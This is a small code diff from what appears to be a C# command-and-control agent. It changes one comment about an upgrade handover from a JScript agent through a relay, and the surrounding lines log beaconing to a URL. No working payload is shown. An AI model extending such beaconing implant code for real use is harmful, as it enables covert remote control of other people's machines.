@@ -37,7 +37,7 @@ namespace CSharpAgent
             _headers = headers;
             Log("beaconing to " + beaconUrl + " as " + headers[1][1]);
 
-            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B UpgradeNetFramework command
+            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
             // that the relay already delivered to the JScript agent on this machine; the
             // requester waiting on the relay's FIFO expects that command's u32 status on the
             // NEXT request body this session sends. That next request is OUR first POST, so it
